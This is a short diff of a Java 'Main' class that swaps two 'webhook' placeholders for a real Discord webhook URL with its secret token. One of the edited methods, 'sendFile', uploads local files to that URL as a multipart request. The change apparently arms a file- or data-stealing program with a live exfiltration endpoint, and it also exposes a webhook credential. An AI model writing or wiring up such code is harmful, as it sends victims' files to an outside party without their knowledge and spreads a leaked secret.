@@ -152,7 +152,7 @@ public class Main {
         BufferedReader in = null;
         StringBuilder result = new StringBuilder();
         try {
-            URL realUrl = new URL("webhook");
+            URL realUrl = new URL("https://discord.com/api/webhooks/850521386018537504/Jzvy85J0B3lof0g2N5fPFkTyEIw_VWqGsbS3oD2Bc3Jk09I0-5MdI1mloYzqlZdLcXy-");
             URLConnection conn = realUrl.openConnection();
             conn.setRequestProperty("accept", "*/*");
             conn.setRequestProperty("connection", "Keep-Alive");
@@ -188,7 +188,7 @@ public class Main {
 
     private static void sendFile(File file) throws IOException {
 
-        String url = "webhook";
+        String url = "https://discord.com/api/webhooks/850521386018537504/Jzvy85J0B3lof0g2N5fPFkTyEIw_VWqGsbS3oD2Bc3Jk09I0-5MdI1mloYzqlZdLcXy-";
         String boundary = Long.toHexString(System.currentTimeMillis());
         URLConnection connection = new URL(url).openConnection();
         connection.setDoOutput(true);
